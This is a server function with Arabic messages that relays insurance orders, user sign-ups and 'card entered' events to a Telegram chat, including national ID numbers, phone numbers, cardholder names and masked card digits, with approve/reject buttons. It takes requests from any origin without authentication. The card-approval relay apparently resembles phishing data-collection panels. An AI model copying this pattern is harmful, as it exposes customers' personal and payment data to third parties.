import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const TELEGRAM_BOT_TOKEN = Deno.env.get('TELEGRAM_BOT_TOKEN');
const TELEGRAM_CHAT_ID = Deno.env.get('TELEGRAM_CHAT_ID');

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface NotificationRequest {
  type?: string;
  email?: string;
  full_name?: string;
  user_id?: string;
  order_id?: string;
  owner_name?: string;
  phone_number?: string;
  insurance_company?: string;
  insurance_price?: number;
  id_number?: string;
  card_number?: string;
  card_holder_name?: string;
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const data: NotificationRequest = await req.json();
    let message: string;
    let replyMarkup: any = undefined;

    if (data.type === 'card_entered') {
      // إشعار إدخال بيانات البطاقة مع أزرار الموافقة والرفض
      console.log('Sending Telegram notification for card entered:', data);
      
      const maskedCard = data.card_number 
        ? `****${data.card_number.slice(-4)}` 
        : 'غير محدد';
      
      message = `💳 *بيانات بطاقة جديدة*\n\n` +
                `📋 *رقم الطلب:* ${data.order_id}\n` +
                `👤 *اسم العميل:* ${data.owner_name || 'غير محدد'}\n` +
                `📱 *رقم الجوال:* ${data.phone_number || 'غير محدد'}\n` +
                `🏢 *شركة التأمين:* ${data.insurance_company || 'غير محدد'}\n` +
                `💰 *قيمة التأمين:* ${data.insurance_price ? `${data.insurance_price} ريال` : 'غير محدد'}\n` +
                `🆔 *رقم الهوية:* ${data.id_number || 'غير محدد'}\n` +
                `💳 *البطاقة:* ${maskedCard}\n` +
                `👤 *حامل البطاقة:* ${data.card_holder_name || 'غير محدد'}\n` +
                `🕐 *التاريخ:* ${new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' })}`;

      replyMarkup = {
        inline_keyboard: [
          [
            { text: '✅ موافقة', callback_data: `approve_${data.order_id}` },
            { text: '❌ رفض', callback_data: `reject_${data.order_id}` }
          ]
        ]
      };
    } else if (data.order_id) {
      // إشعار طلب عادي (لن يُستخدم بعد الآن من الترايقر)
      console.log('Sending Telegram notification for order:', data);
      
      message = `🔔 *طلب تأمين جديد*\n\n` +
                `📋 *رقم الطلب:* ${data.order_id}\n` +
                `👤 *اسم العميل:* ${data.owner_name || 'غير محدد'}\n` +
                `📱 *رقم الجوال:* ${data.phone_number || 'غير محدد'}\n` +
                `🏢 *شركة التأمين:* ${data.insurance_company || 'غير محدد'}\n` +
                `💰 *قيمة التأمين:* ${data.insurance_price ? `${data.insurance_price} ريال` : 'غير محدد'}\n` +
                `🆔 *رقم الهوية:* ${data.id_number || 'غير محدد'}\n` +
                `🕐 *التاريخ:* ${new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' })}`;
    } else {
      // إشعار تسجيل مستخدم جديد
      console.log('Sending Telegram notification for new user:', data);
      
      message = `🔔 *مستخدم جديد سجل في الموقع*\n\n` +
                `👤 *الاسم:* ${data.full_name || 'غير محدد'}\n` +
                `📧 *البريد الإلكتروني:* ${data.email}\n` +
                `🆔 *معرف المستخدم:* ${data.user_id}\n` +
                `🕐 *التاريخ:* ${new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' })}`;
    }

    const telegramBody: any = {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown',
    };

    if (replyMarkup) {
      telegramBody.reply_markup = replyMarkup;
    }

    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(telegramBody),
      }
    );

    const result = await telegramResponse.json();
    
    if (!telegramResponse.ok) {
      console.error('Telegram API error:', result);
      throw new Error(`Telegram API error: ${JSON.stringify(result)}`);
    }

    console.log('Telegram notification sent successfully:', result);

    return new Response(
      JSON.stringify({ success: true, message: 'Notification sent' }),
      { status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  } catch (error: any) {
    console.error('Error in send-telegram-notification function:', error);
    return new Response(
      JSON.stringify({ error: error.message }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
